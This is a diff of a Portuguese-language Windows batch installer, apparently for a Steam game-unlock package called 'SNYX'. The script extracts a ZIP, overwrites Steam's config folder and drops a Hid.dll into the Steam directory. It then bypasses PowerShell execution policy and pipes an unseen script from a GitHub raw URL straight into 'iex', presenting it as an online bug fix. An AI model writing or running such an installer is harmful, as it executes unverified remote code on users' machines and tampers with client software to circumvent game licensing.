@@ -1,26 +1,26 @@
 @echo off
 setlocal EnableDelayedExpansion
+:: Força o BAT a trabalhar na pasta onde ele está (vital para achar o ZIP)
+cd /d "%~dp0"
 chcp 65001 >nul
-title Instalador
+title Instalador SNYX
 mode con: cols=100 lines=30
 
 :: =====================================================
 :: CONFIGURAÇÕES INTERNAS
 :: =====================================================
-:: O arquivo ZIP deve estar embutido no EXE com este nome exato:
 set "ARQUIVO_ZIP=Pmw games unlock.zip"
 set "URL_FIX=https://raw.githubusercontent.com/KRAYz-Oficial/KRAYz-Oficial/67065f398be63e1fe2c29ef2838f3030490eb3b6/Remover-bugs.ps1"
 
 :: =====================================================
-:: 1. VERIFICAÇÃO DE INTEGRIDADE (ARQUIVO EMBUTIDO)
+:: 1. VERIFICAÇÃO DE INTEGRIDADE
 :: =====================================================
-:: Como é um EXE, o arquivo ZIP é extraído para a pasta temporária junto com o script.
 if not exist "%ARQUIVO_ZIP%" (
     cls
     color 0C
     echo.
-    echo  [ERRO CRITICO] O arquivo de dados "%ARQUIVO_ZIP%" nao foi encontrado.
-    echo  O executavel pode estar corrompido ou o antivirus bloqueou a extracao.
+    echo  [ERRO CRITICO] O arquivo "%ARQUIVO_ZIP%" não foi encontrado na pasta SNYX_WORK.
+    echo  Verifique se o download foi bloqueado pelo Antivirus.
     echo.
     pause
     exit /b
@@ -31,7 +31,7 @@ if not exist "%ARQUIVO_ZIP%" (
 :: =====================================================
 cls
 echo.
-echo  [INFO] Buscando diretorio da Steam...
+echo  [INFO] Buscando diretório da Steam no Registro...
 
 for /f "tokens=3*" %%A in ('reg query "HKCU\Software\Valve\Steam" /v SteamExe 2^>nul') do (
     set "steamExe=%%A %%B"
@@ -40,8 +40,7 @@ for /f "tokens=3*" %%A in ('reg query "HKCU\Software\Valve\Steam" /v SteamExe 2^
 if not defined steamExe (
     color 0C
     echo.
-    echo  [ERRO] A Steam nao foi encontrada no Registro do Windows.
-    echo  Verifique se a Steam esta instalada corretamente.
+    echo  [ERRO] A Steam não foi encontrada.
     pause
     exit /b
 )
@@ -55,8 +54,8 @@ set "configDir=%steamDir%\config"
 :: =====================================================
 color 0A
 echo.
-echo  [OK] Steam localizada.
-echo  [OK] Arquivos verificados.
+echo  [OK] Steam localizada em: %steamDir%
+echo  [OK] Pacote de dados pronto.
 echo.
 echo  Iniciando instalacao automatica...
 timeout /t 2 >nul
@@ -73,15 +72,15 @@ timeout /t 2 >nul
 echo  [+] Extraindo arquivos...
 if exist "%temp%\pmw_temp" rmdir /s /q "%temp%\pmw_temp"
 
-:: Extrai o ZIP que está na mesma pasta temporária do EXE
-powershell -Command "Expand-Archive '%ARQUIVO_ZIP%' -DestinationPath $env:TEMP\pmw_temp -Force"
+:: Extrai o ZIP que o Python baixou na mesma pasta
+powershell -Command "Expand-Archive -Path '%ARQUIVO_ZIP%' -DestinationPath '%temp%\pmw_temp' -Force"
 
 :: Cópia dos Arquivos
-echo  [+] Copiando configuracoes...
+echo  [+] Copiando configurações para a Steam...
 xcopy /e /i /y "%temp%\pmw_temp\Config\*" "%configDir%\" >nul
 copy /y "%temp%\pmw_temp\Hid.dll" "%steamDir%\" >nul
 
-:: Limpeza
+:: Limpeza de Temporários
 rmdir /s /q "%temp%\pmw_temp" >nul
 
 :: Reabre a Steam
@@ -96,39 +95,36 @@ echo  [+] Executando script de correcao online...
 powershell -NoProfile -ExecutionPolicy Bypass -Command "iwr -useb '%URL_FIX%' | iex"
 
 echo.
-echo  [+] Abrindo pagina de agradecimento...
-start "" "%URL_AGRADECIMENTO%"
-
-echo.
 echo ========================================================
-echo        INSTALACAO FINALIZADA COM SUCESSO!
+echo         INSTALACAO FINALIZADA COM SUCESSO!
 echo ========================================================
 echo.
-timeout /t 3
-exit /b
+echo  Esta janela fechara sozinha em 5 segundos...
+timeout /t 5 >nul
+exit
 
 :BarraProgresso
 cls
 echo.
-echo  Preparando instalacao...
+echo  Processando instalacao SNYX...
 echo.
 echo  [#####               ] 25%%
 timeout /t 1 /nobreak >nul
 cls
 echo.
-echo  Preparando instalacao...
+echo  Processando instalacao SNYX...
 echo.
 echo  [##########          ] 50%%
 timeout /t 1 /nobreak >nul
 cls
 echo.
-echo  Preparando instalacao...
+echo  Processando instalacao SNYX...
 echo.
 echo  [###############     ] 75%%
 timeout /t 1 /nobreak >nul
 cls
 echo.
-echo  Preparando instalacao...
+echo  Processando instalacao SNYX...
 echo.
 echo  [####################] 100%%
 timeout /t 1 /nobreak >nul
